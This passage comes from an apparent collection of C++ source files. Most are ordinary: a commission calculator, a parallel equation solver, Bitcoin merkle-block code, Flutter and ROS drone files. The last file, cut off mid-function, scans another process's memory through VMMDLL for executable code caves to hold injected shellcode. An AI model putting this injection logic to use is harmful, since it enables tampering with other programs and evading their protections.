\"South-West\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_SOUTHEAST:\n\t\t\tos << \"South-East\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_NORTHWEST:\n\t\t\tos << \"North-West\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_NORTHEAST:\n\t\t\tos << \"North-East\";\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tbreak;\n\t}\n\n\treturn os;\n}\n",
    "#include <chrono> \n#include <iostream>\n#include <random>\n#include <string>\n#include <sstream>\n#include <thread>\n#include <vector>\n\n#include \"ArgHandler.hpp\"\n\n// Global random number generator\nstd::mt19937_64 generator; \n\n// Function declarations\nvoid generateRandomNumbers(unsigned long long);\nstd::chrono::system_clock::time_point spawnThreads(\n  unsigned long long, unsigned long long);\n\n// Main\nint main(int argc, char* argv[]) {\n\n  // Argument variables\n  unsigned long long threads, iterations;  \n\n  // Seed generator\n  generator.seed(std::random_device()());\n\n  // Parse arguments\n  int result = ArgHandler(argc, argv);\n\n  if(result == 0) return 1;\n\n  if(result == 1) {\n    try {\n      std::stringstream(argv[2]) >> iterations;\n    } catch(const std::exception& e) {\n      std::cout << \"Error parsing iterations\\n\";\n    }\n\n    try {  \n      std::stringstream(argv[3]) >> threads;\n    } catch(const std::exception& e) {\n      std::cout << \"Error parsing threads\\n\";\n    }\n  } else if(result == -1) {}\n\n  // Start timer\n  auto start = std::chrono::high_resolution_clock::now();\n\n  // Spawn threads\n  auto end = spawnThreads(threads, iterations);\n\n  // Print elapsed time\n  std::chrono::duration<double, std::milli> ms = end - start;\n  std::cout << std::endl << \"Time taken: \" << ms.count() << \"ms\\n\";\n\n  return 0;\n\n}\n\nstd::chrono::system_clock::time_point spawnThreads(unsigned long long threads, unsigned long long iterations) {\n\n  std::vector<std::thread> threadPool(threads);\n\n  for(unsigned long long i = 0; i < threads; i++) {\n    threadPool[i] = std::thread(generateRandomNumbers, iterations); \n  }\n\n  for(auto& thread : threadPool) {\n    thread.join();\n  }\n\n  return std::chrono::system_clock::now();\n\n}\n\nvoid generateRandomNumbers(unsigned long long iterations) {\n\n  for(unsigned long long i = 0; i < iterations; i++) {\n    std::cout << generator();\n  }\n\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    int codigo_representante;\r\n    float total_itens, total_vendas = 0, valor_pedido, comissao, total_comissao = 0;\r\n    float total_representante1 = 0, total_representante2 = 0, total_representante3 = 0, total_representante4 = 0;\r\n    char continuar;\r\n\r\n    cout << fixed << setprecision(2);\r\n\r\n    do {\r\n        do{\r\n        cout << \"Digite o codigo do representante (1 a 4): \";\r\n        cin >> codigo_representante;\r\n        } while(codigo_representante < 1 or codigo_representante > 4);\r\n        \r\n        do{\r\n        cout << \"Digite o total de itens do pedido: \";\r\n        cin >> total_itens;\r\n        } while(total_itens < 0);\r\n\r\n        do{\r\n        cout << \"Digite o valor total da venda: \";\r\n        cin >> valor_pedido;\r\n        } while (valor_pedido < 0);\r\n        \r\n        if (total_itens < 20)\r\n            comissao = valor_pedido * 0.10;\r\n        else if (total_itens >= 20 && total_itens <= 49)\r\n            comissao = valor_pedido * 0.15;\r\n        else if (total_itens >= 50 && total_itens <= 74)\r\n            comissao = valor_pedido * 0.20;\r\n        else\r\n            comissao = valor_pedido * 0.25;\r\n\r\n        total_vendas += valor_pedido;\r\n        total_comissao += comissao;\r\n\r\n        switch (codigo_representante) {\r\n            case 1:\r\n                total_representante1 += comissao;\r\n                break;\r\n            case 2:\r\n                total_representante2 += comissao;\r\n                break;\r\n            case 3:\r\n                total_representante3 += comissao;\r\n                break;\r\n            case 4:\r\n                total_representante4 += comissao;\r\n                break;\r\n        }\r\n\r\n        cout << \"Valor da comiss\u00e3o: \" << comissao << endl;\r\n        \r\n        do{\r\n        cout << \"Deseja informar mais um pedido? (S/N): \";\r\n        cin >> continuar;\r\n        continuar = toupper(continuar);\r\n        } while(continuar != 'S' and continuar != 'N');\r\n   \r\n    } while (continuar != 'N' && continuar != 'n');\r\n\r\n    cout << \"Total de vendas dos pedidos processados: \" << total_vendas << endl;\r\n    cout << \"Total de comissoes para o representante 1: \" << total_representante1 << endl;\r\n    cout << \"Total de comissoes para o representante 2: \" << total_representante2 << endl;\r\n    cout << \"Total de comissoes para o representante 3: \" << total_representante3 << endl;\r\n    cout << \"Total de comissoes para o representante 4: \" << total_representante4 << endl;\r\n    cout << \"Total de comissoes que a companhia pagou aos seus representantes: \" << total_comissao << endl;\r\n\r\n    return 0;\r\n}",
    "/**\n * @file ParallelSolver.cpp\n *\n * @brief ParallelSolver class for solving quadratic and linear equations in parallel.\n *\n * @author Hovsep Papoyan\n * Contact: papoyanhovsep93@gmail.com\n * @Date 2024-03-28\n *\n */\n\n#include \"ParallelSolver.h\"\n\n#include <sstream>\n#include <future>\n\nnamespace slv\n{\n    std::vector<Solver::Result>\n        ParallelSolver::BlockSolver::operator()(const std::vector<int>& coeffs, std::size_t first, const std::size_t last) const\n    {\n        std::vector<Solver::Result> result;\n        result.reserve(last - first);\n        while (first != last)\n        {\n            result.emplace_back(Solver::solve(coeffs[first], coeffs[first + 1], coeffs[first + 2])); // Passing a,b,c coefficients.\n            first += 3; // 3 because a,b,c coefficients.\n        }\n        return result;\n    }\n\n    std::ostream& operator<<(std::ostream& os, const ParallelSolver& pSolver)\n    {\n        std::stringstream out;\n        out.setf(std::ios::fixed);\n        size_t currentIndex = 0;\n        for (const std::vector<Solver::Result>& results : pSolver.m_results)\n        {\n            for (const Solver::Result& result : results)\n            {\n                out << \"INPUT: (\" << pSolver.m_coeffs[currentIndex] << \", \"\n                    << pSolver.m_coeffs[currentIndex + 1] << \", \"\n                    << pSolver.m_coeffs[currentIndex + 2] << \")\\nOUTPUT: \";\n                if (std::holds_alternative<Solver::LinearResult>(result))\n                {\n                    if (const Solver::LinearResult& r = std::get<Solver::LinearResult>(result))\n                    {\n                        out << '(' << r.value() << \"). GLOBAL MIN(MAX) = \" << r.value();\n                    }\n                    else\n                    {\n                        out << (pSolver.m_coeffs[currentIndex + 2] == 0 ? \"AN IDENTITY\" : \"NOT CORRECT\");\n                    }\n                }\n                else\n                {\n                    const Solver::QuadraticResult& r = std::get<Solver::QuadraticResult>(result);\n                    if (r.m_roots)\n                    {\n                        out << '(' << r.m_roots.value().first << \", \" << r.m_roots.value().second << ')';\n                    }\n                    else\n                    {\n                        out << \"NO REAL ROOTS\";\n                    }\n                    out << \". GLOBAL \" << (pSolver.m_coeffs[currentIndex] > 0 ? \"MIN\" : \"MAX\")\n                        << \" = \" << r.m_extremum << \" AT x = \" << r.m_criticalPoint;\n                }\n                currentIndex += 3; // 3 because a,b,c coefficients.\n                out << \"\\n\\n\";\n            }\n        }\n        os << out.rdbuf();\n        return os;\n    }\n\n    void ParallelSolver::operator()(std::vector<int> items)\n    {\n        m_coeffs = std::move(items);\n        // At this point sz >= 3 && sz % 3 == 0. Validated by InputValidator.\n        const std::size_t sz = m_coeffs.size();\n        // minCoeffsCountPerThread must be chosen >= 3 && minCoeffsCountPerThread % 3 == 0.\n        static constexpr std::size_t minCoeffsCountPerThread = 24;\n        const std::size_t maxThreads = (sz + minCoeffsCountPerThread - 1) / minCoeffsCountPerThread;\n        static const std::size_t hardwareThreads = std::jthread::hardware_concurrency();\n        // In case of hardwareThreads == 0, the value 2 chosen hypothetically,\n        // Taking into account that in this application 4 threads already can be started\n        // (2 threads per consumer and 2 threads per producer).\n        const std::size_t numThreads = std::min(hardwareThreads != 0 ? hardwareThreads : 2, maxThreads);\n        // The work is divided almost equally between numThreads (except the last thread).\n        const std::size_t blockSize = sz / numThreads / 3 * 3;\n        const std::size_t numThreadsMinusOne = numThreads - 1;\n\n        std::vector<std::future<std::vector<Solver::Result>>> futures(numThreadsMinusOne);\n        // In case of exception or normal finish of execution threads will be automatically joined.\n        std::vector<std::jthread> threads(numThreadsMinusOne);\n\n        std::size_t blockStart = 0;\n        for (std::size_t i = 0; i < numThreadsMinusOne; ++i)\n        {\n            std::size_t blockEnd = blockStart;\n            blockEnd += blockSize; // every spawn thread will process blockSize coefficients.\n            std::packaged_task<\n                std::vector<Solver::Result>(\n                    const std::vector<int>&, std::size_t, const std::size_t)> task(BlockSolver{});\n            futures[i] = task.get_future();\n            threads[i] = std::jthread(std::move(task), std::cref(m_coeffs), blockStart, blockEnd);\n            blockStart = blockEnd;\n        }\n\n        m_results.resize(numThreads);\n        for (std::size_t i = 0; i < numThreadsMinusOne; ++i)\n        {\n            m_results[i] = futures[i].get();\n        }\n        // The last portion of work done by current thread.\n        m_results[numThreadsMinusOne] = BlockSolver{}(m_coeffs, blockSt",
    "// Copyright (c) 2017-2022 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <chainparams.h>\n#include <common/args.h>\n#include <index/base.h>\n#include <interfaces/chain.h>\n#include <kernel/chain.h>\n#include <logging.h>\n#include <node/abort.h>\n#include <node/blockstorage.h>\n#include <node/context.h>\n#include <node/database_args.h>\n#include <node/interface_ui.h>\n#include <tinyformat.h>\n#include <util/thread.h>\n#include <util/translation.h>\n#include <validation.h> // For g_chainman\n#include <warnings.h>\n\n#include <string>\n#include <utility>\n\nconstexpr uint8_t DB_BEST_BLOCK{'B'};\n\nconstexpr auto SYNC_LOG_INTERVAL{30s};\nconstexpr auto SYNC_LOCATOR_WRITE_INTERVAL{30s};\n\ntemplate <typename... Args>\nvoid BaseIndex::FatalErrorf(const char* fmt, const Args&... args)\n{\n    auto message = tfm::format(fmt, args...);\n    node::AbortNode(m_chain->context()->shutdown, m_chain->context()->exit_status, message);\n}\n\nCBlockLocator GetLocator(interfaces::Chain& chain, const uint256& block_hash)\n{\n    CBlockLocator locator;\n    bool found = chain.findBlock(block_hash, interfaces::FoundBlock().locator(locator));\n    assert(found);\n    assert(!locator.IsNull());\n    return locator;\n}\n\nBaseIndex::DB::DB(const fs::path& path, size_t n_cache_size, bool f_memory, bool f_wipe, bool f_obfuscate) :\n    CDBWrapper{DBParams{\n        .path = path,\n        .cache_bytes = n_cache_size,\n        .memory_only = f_memory,\n        .wipe_data = f_wipe,\n        .obfuscate = f_obfuscate,\n        .options = [] { DBOptions options; node::ReadDatabaseArgs(gArgs, options); return options; }()}}\n{}\n\nbool BaseIndex::DB::ReadBestBlock(CBlockLocator& locator) const\n{\n    bool success = Read(DB_BEST_BLOCK, locator);\n    if (!success) {\n        locator.SetNull();\n    }\n    return success;\n}\n\nvoid BaseIndex::DB::WriteBestBlock(CDBBatch& batch, const CBlockLocator& locator)\n{\n    batch.Write(DB_BEST_BLOCK, locator);\n}\n\nBaseIndex::BaseIndex(std::unique_ptr<interfaces::Chain> chain, std::string name)\n    : m_chain{std::move(chain)}, m_name{std::move(name)} {}\n\nBaseIndex::~BaseIndex()\n{\n    Interrupt();\n    Stop();\n}\n\nbool BaseIndex::Init()\n{\n    AssertLockNotHeld(cs_main);\n\n    // May need reset if index is being restarted.\n    m_interrupt.reset();\n\n    // m_chainstate member gives indexing code access to node internals. It is\n    // removed in followup https://github.com/bitcoin/bitcoin/pull/24230\n    m_chainstate = WITH_LOCK(::cs_main,\n        return &m_chain->context()->chainman->GetChainstateForIndexing());\n    // Register to validation interface before setting the 'm_synced' flag, so that\n    // callbacks are not missed once m_synced is true.\n    RegisterValidationInterface(this);\n\n    CBlockLocator locator;\n    if (!GetDB().ReadBestBlock(locator)) {\n        locator.SetNull();\n    }\n\n    LOCK(cs_main);\n    CChain& index_chain = m_chainstate->m_chain;\n\n    if (locator.IsNull()) {\n        SetBestBlockIndex(nullptr);\n    } else {\n        // Setting the best block to the locator's top block. If it is not part of the\n        // best chain, we will rewind to the fork point during index sync\n        const CBlockIndex* locator_index{m_chainstate->m_blockman.LookupBlockIndex(locator.vHave.at(0))};\n        if (!locator_index) {\n            return InitError(strprintf(Untranslated(\"%s: best block of the index not found. Please rebuild the index.\"), GetName()));\n        }\n        SetBestBlockIndex(locator_index);\n    }\n\n    // Child init\n    const CBlockIndex* start_block = m_best_block_index.load();\n    if (!CustomInit(start_block ? std::make_optional(interfaces::BlockKey{start_block->GetBlockHash(), start_block->nHeight}) : std::nullopt)) {\n        return false;\n    }\n\n    // Note: this will latch to true immediately if the user starts up with an empty\n    // datadir and an index enabled. If this is the case, indexation will happen solely\n    // via `BlockConnected` signals until, possibly, the next restart.\n    m_synced = start_block == index_chain.Tip();\n    m_init = true;\n    return true;\n}\n\nstatic const CBlockIndex* NextSyncBlock(const CBlockIndex* pindex_prev, CChain& chain) EXCLUSIVE_LOCKS_REQUIRED(cs_main)\n{\n    AssertLockHeld(cs_main);\n\n    if (!pindex_prev) {\n        return chain.Genesis();\n    }\n\n    const CBlockIndex* pindex = chain.Next(pindex_prev);\n    if (pindex) {\n        return pindex;\n    }\n\n    return chain.Next(chain.FindFork(pindex_prev));\n}\n\nvoid BaseIndex::ThreadSync()\n{\n    const CBlockIndex* pindex = m_best_block_index.load();\n    if (!m_synced) {\n        std::chrono::steady_clock::time_point last_log_time{0s};\n        std::chrono::steady_clock::time_point last_locator_write_time{0s};\n        while (true) {\n            if (m_interrupt) {\n                LogPrintf(\"%s: m_interrupt set; exiting ThreadSync\\n\", GetName());\n\n                SetBestBlockIndex(pindex);\n                // No need to handle errors in Commit. If i",
    "// Copyright (c) 2009-2010 Satoshi Nakamoto\n// Copyright (c) 2009-2015 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <merkleblock.h>\n\n#include <hash.h>\n#include <consensus/consensus.h>\n\n\nstd::vector<unsigned char> BitsToBytes(const std::vector<bool>& bits)\n{\n    std::vector<unsigned char> ret((bits.size() + 7) / 8);\n    for (unsigned int p = 0; p < bits.size(); p++) {\n        ret[p / 8] |= bits[p] << (p % 8);\n    }\n    return ret;\n}\n\nstd::vector<bool> BytesToBits(const std::vector<unsigned char>& bytes)\n{\n    std::vector<bool> ret(bytes.size() * 8);\n    for (unsigned int p = 0; p < ret.size(); p++) {\n        ret[p] = (bytes[p / 8] & (1 << (p % 8))) != 0;\n    }\n    return ret;\n}\n\nCMerkleBlock::CMerkleBlock(const CBlock& block, CBloomFilter* filter, const std::set<uint256>* txids)\n{\n    header = block.GetBlockHeader();\n\n    std::vector<bool> vMatch;\n    std::vector<uint256> vHashes;\n\n    vMatch.reserve(block.vtx.size());\n    vHashes.reserve(block.vtx.size());\n\n    const static std::set<int> allowedTxTypes = {\n            TRANSACTION_NORMAL,\n            TRANSACTION_PROVIDER_REGISTER,\n            TRANSACTION_PROVIDER_UPDATE_SERVICE,\n            TRANSACTION_PROVIDER_UPDATE_REGISTRAR,\n            TRANSACTION_PROVIDER_UPDATE_REVOKE,\n            TRANSACTION_COINBASE,\n    };\n\n    for (unsigned int i = 0; i < block.vtx.size(); i++)\n    {\n        const auto& tx = *block.vtx[i];\n        const uint256& hash = tx.GetHash();\n        bool isAllowedType = tx.nVersion != 3 || allowedTxTypes.count(tx.nType) != 0;\n\n        if (txids && txids->count(hash)) {\n            vMatch.push_back(true);\n        } else if (isAllowedType && filter && filter->IsRelevantAndUpdate(*block.vtx[i])) {\n            vMatch.push_back(true);\n            vMatchedTxn.emplace_back(i, hash);\n        } else {\n            vMatch.push_back(false);\n        }\n        vHashes.push_back(hash);\n    }\n\n    txn = CPartialMerkleTree(vHashes, vMatch);\n}\n\nuint256 CPartialMerkleTree::CalcHash(int height, unsigned int pos, const std::vector<uint256> &vTxid) {\n    //we can never have zero txs in a merkle block, we always need the coinbase tx\n    //if we do not have this assert, we can hit a memory access violation when indexing into vTxid\n    assert(vTxid.size() != 0);\n    if (height == 0) {\n        // hash at height 0 is the txids themself\n        return vTxid[pos];\n    } else {\n        // calculate left hash\n        uint256 left = CalcHash(height-1, pos*2, vTxid), right;\n        // calculate right hash if not beyond the end of the array - copy left hash otherwise\n        if (pos*2+1 < CalcTreeWidth(height-1))\n            right = CalcHash(height-1, pos*2+1, vTxid);\n        else\n            right = left;\n        // combine subhashes\n        return Hash(left.begin(), left.end(), right.begin(), right.end());\n    }\n}\n\nvoid CPartialMerkleTree::TraverseAndBuild(int height, unsigned int pos, const std::vector<uint256> &vTxid, const std::vector<bool> &vMatch) {\n    // determine whether this node is the parent of at least one matched txid\n    bool fParentOfMatch = false;\n    for (unsigned int p = pos << height; p < (pos+1) << height && p < nTransactions; p++)\n        fParentOfMatch |= vMatch[p];\n    // store as flag bit\n    vBits.push_back(fParentOfMatch);\n    if (height==0 || !fParentOfMatch) {\n        // if at height 0, or nothing interesting below, store hash and stop\n        vHash.push_back(CalcHash(height, pos, vTxid));\n    } else {\n        // otherwise, don't store any hash, but descend into the subtrees\n        TraverseAndBuild(height-1, pos*2, vTxid, vMatch);\n        if (pos*2+1 < CalcTreeWidth(height-1))\n            TraverseAndBuild(height-1, pos*2+1, vTxid, vMatch);\n    }\n}\n\nuint256 CPartialMerkleTree::TraverseAndExtract(int height, unsigned int pos, unsigned int &nBitsUsed, unsigned int &nHashUsed, std::vector<uint256> &vMatch, std::vector<unsigned int> &vnIndex) {\n    if (nBitsUsed >= vBits.size()) {\n        // overflowed the bits array - failure\n        fBad = true;\n        return uint256();\n    }\n    bool fParentOfMatch = vBits[nBitsUsed++];\n    if (height==0 || !fParentOfMatch) {\n        // if at height 0, or nothing interesting below, use stored hash and do not descend\n        if (nHashUsed >= vHash.size()) {\n            // overflowed the hash array - failure\n            fBad = true;\n            return uint256();\n        }\n        const uint256 &hash = vHash[nHashUsed++];\n        if (height==0 && fParentOfMatch) { // in case of height 0, we have a matched txid\n            vMatch.push_back(hash);\n            vnIndex.push_back(pos);\n        }\n        return hash;\n    } else {\n        // otherwise, descend into the subtrees to extract matched txids and hashes\n        uint256 left = TraverseAndExtract(height-1, pos*2, nBitsUsed, nHashUsed, vMatch, vnIndex), right;\n        if (pos*2+1 < CalcTreeWidth(height-1)) {\n            right = Trave",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"SF_InactiveState.h\"\n\n/* Public Methods and Constructor */\nSFInactiveState::SFInactiveState(string state_label, ros::ServiceClient &arming_service_client, \n                                ros::ServiceClient &set_flight_mode_client) : \n                                SFBaseState(state_label), arming_service_client(arming_service_client), \n                                set_flight_mode_client(set_flight_mode_client), start_position(Vector3d::Zero())\n{\n    // Add the neighbor states\n    addNeighborState(string(\"Take-off\"), [this]() { return defaultTransitionGuard(); });\n}\n\nvoid SFInactiveState::entry(const Vector3d &curr_position, const Vector3d &prev_desired_position, string &args)\n{\n    // Reset the desired state\n    setDesiredState(getStateLabel());\n\n    // Set start position\n    start_position = curr_position;\n\n    // Switch to Stabilize flight mode\n    mavros_msgs::SetMode flight_mode_srv;\n    flight_mode_srv.request.base_mode = 0;//flight_mode_srv.request.MAV_MODE_STABILIZE_ARMED;\n    flight_mode_srv.request.custom_mode = string(\"STABILIZE\"); //string(\"\");\n    uint16_t attempt_counter = 0;\n    while(!(set_flight_mode_client.call(flight_mode_srv) && flight_mode_srv.response.mode_sent) && (attempt_counter < 10))\n    {\n        attempt_counter++;\n        ROS_INFO(\"Failed to change flight mode, reattempting in 100ms\");\n        ros::Duration(0.1).sleep();\n    }\n\n    // If unsuccessful then wait for manual flight mode change\n    if(attempt_counter == 10)\n    {\n        double wait_time = 15.0;\n        ROS_INFO(\"Please change flight mode to STABILIZE manually\");\n        while(wait_time > 0)\n        {\n            ROS_INFO(\"Attemping to disarm in %.2f seconds\", wait_time);\n            wait_time -= 1.0;\n            ros::Duration(1.0).sleep();\n        }\n    }\n    // Mode change successful\n    else\n    {\n        ROS_INFO(\"Changed flight mode successfully, active mode: STABILIZE\");\n        ROS_INFO(\"Disarming in %.2f seconds\", 1.0);\n        ros::Duration(1.0).sleep();\n    }\n\n    // Disarm the motors\n    mavros_msgs::CommandBool arming_srv;\n    arming_srv.request.value = false;\n    attempt_counter = 0;\n    while(!(arming_service_client.call(arming_srv) && arming_srv.response.success) && (attempt_counter < 20))\n    {\n        attempt_counter++;\n        ROS_INFO(\"Failed to disarm, reattempting in 250ms\");\n        ros::Duration(0.25).sleep();\n    }\n\n    // Failed to disarm after all attempts\n    if(attempt_counter == 20)\n    {\n        ROS_ERROR(\"Cannot disarm, please disarm manually!!\");\n    }\n    // Disarmed successfully\n    else\n    {\n        ROS_INFO(\"Disarmed successfully\");\n    }\n}\n\n/* Protected Methods */\n\nMatrix3d SFInactiveState::during()\n{\n    // Construct the desired trajectory matrix\n    Matrix3d desired_traj;\n    Vector3d zero_vect = Vector3d::Zero();\n    desired_traj << start_position, zero_vect, zero_vect;\n    \n    return desired_traj;\n}\n\nbool SFInactiveState::exit(string &exit_status)\n{\n    // Switch to GUIDED_NOGPS flight mode\n    mavros_msgs::SetMode flight_mode_srv;\n    flight_mode_srv.request.base_mode = 0;\n    flight_mode_srv.request.custom_mode = string(\"GUIDED_NOGPS\");\n    uint16_t attempt_counter = 0;\n    while(!(set_flight_mode_client.call(flight_mode_srv) && flight_mode_srv.response.mode_sent) && (attempt_counter < 10))\n    {\n        attempt_counter++;\n        ROS_INFO(\"Failed to change flight mode, reattempting in 100ms\");\n        ros::Duration(0.1).sleep();\n    }\n\n    // If unsuccessful then wait for manual flight mode change\n    if(attempt_counter == 10)\n    {\n        double wait_time = 20.0;\n        ROS_INFO(\"Please change flight mode to GUIDED_NOGPS manually\");\n        while(wait_time > 0)\n        {\n            ROS_INFO(\"Attemping to arm in %.2f seconds\", wait_time);\n            wait_time -= 1.0;\n            ros::Duration(1.0).sleep();\n        }\n    }\n    // Mode change successful\n    else\n    {\n        ROS_INFO(\"Changed flight mode successfully, active mode: GUIDED_NOGPS\");\n        ROS_INFO(\"Arming in %.2f seconds\", 2.0);\n        ros::Duration(2.0).sleep();\n    }\n\n    // Arm the motors\n    mavros_msgs::CommandBool srv;\n    srv.request.value = true;\n    attempt_counter = 0;\n    while(!(arming_service_client.call(srv) && srv.response.success) && (attempt_counter < 20))\n    {\n        attempt_counter++;\n        srv.request.value = true;\n        ROS_INFO(\"%s\", \"\\nFailed to arm, reattempting in 2s\");\n        ros::Duration(2.0).sleep();\n    }\n\n    // Failed to Arm after all attempts\n    if(attempt_counter == 20)\n    {\n        setDesiredState(getStateLabel());\n        ROS_INFO(\"%s\", \"Cannot arm, state transition aborted!!\");\n        return false;\n    }\n    // Armed successfully\n    else\n    {   \n        exit_status += string(\"\\nArmed successfully\");\n        ros::Duration(2.0).sleep();\n        return true;\n    }\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"pch.h\"\n#include \"Shellcode.h\"\n#include \"Memory.h\"\n\nstd::vector<std::string> blacklist = {\"kernel32.dll\", \"kernelbase.dll\", \"wow64.dll\", \"wow64win.dll\", \"wow64cpu.dll\", \"ntoskrnl.exe\", \"win32kbase.sys\"};\n\nuint64_t c_shellcode::find_codecave(size_t function_size, const std::string& process_name, const std::string& module)\n{\n\tint pid = mem.GetPidFromName(process_name);\n\tVMMDLL_PROCESS_INFORMATION process_info = {0};\n\tprocess_info.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;\n\tprocess_info.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;\n\tSIZE_T process_info_size = sizeof(VMMDLL_PROCESS_INFORMATION);\n\tif (!VMMDLL_ProcessGetInformation(mem.vHandle, pid, &process_info, &process_info_size))\n\t{\n\t\tLOG(\"[!] Could not retrieve process for PID: %i\", pid);\n\t\treturn 0;\n\t}\n\n\tDWORD cSections = 0;\n\tif (!VMMDLL_ProcessGetSectionsU(mem.vHandle, pid, const_cast<LPSTR>(module.c_str()), NULL, 0, &cSections) || !cSections)\n\t{\n\t\tLOG(\"[!] Could not retrieve sections #1 for '%s'\\n\", module.c_str());\n\t\treturn 0;\n\t}\n\n\tconst PIMAGE_SECTION_HEADER pSections = static_cast<PIMAGE_SECTION_HEADER>(LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER)));\n\tif (!pSections || !VMMDLL_ProcessGetSectionsU(mem.vHandle, pid, const_cast<LPSTR>(module.c_str()), pSections, cSections, &cSections) || !cSections)\n\t{\n\t\tLOG(\"[!] Could not retrieve sections #2 for '%s'\\n\", module);\n\t\treturn 0;\n\t}\n\n\t/*Scan for code cave*/\n\tuint64_t codecave = 0;\n\tfor (int i = 0; i < cSections; i++)\n\t{\n\t\tif (!codecave && ((pSections[i].Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ))) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - function_size)))\n\t\t{\n\t\t\tcodecave = VMMDLL_ProcessGetModuleBaseU(mem.vHandle, pid, const_cast<LPSTR>(module.c_str())) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize)) + 0x10;\n\t\t\tif (!codecave)\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (!codecave)\n\t{\n\t\tLOG(\"[!] Could not find a code cave for '%s'\\n\", module.c_str());\n\t\treturn 0;\n\t}\n\n\tauto buffer = std::unique_ptr<uint8_t[]>(new uint8_t[function_size]);\n\tif (!mem.Read(codecave, buffer.get(), function_size, pid))\n\t{\n\t\tLOG(\"[!] Could not read codecave for '%s'\\n\", module.c_str());\n\t\treturn 0;\n\t}\n\n\tfor (size_t i = 0; i < function_size; i++)\n\t{\n\t\tif (buffer[i] != 0x0)\n\t\t{\n\t\t\tLOG(\"[!] Codecave isn't big enough for the shellcode.\\n\");\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\treturn codecave;\n}\n\nstd::vector<uint64_t> c_shellcode::find_all_codecave(size_t function_size, const std::string& process_name)\n{\n\tstd::vector<uint64_t> codecaves = { };\n\tstd::vector<std::string> module_list = mem.GetModuleList(process_name);\n\tfor (size_t i = 0; i < module_list.size(); i++)\n\t{\n\t\tif (std::find(blacklist.begin(), blacklist.end(), module_list[i]) != blacklist.end())\n\t\t\tcontinue;\n\n\t\tstd::string module = module_list[i];\n\t\tuint64_t 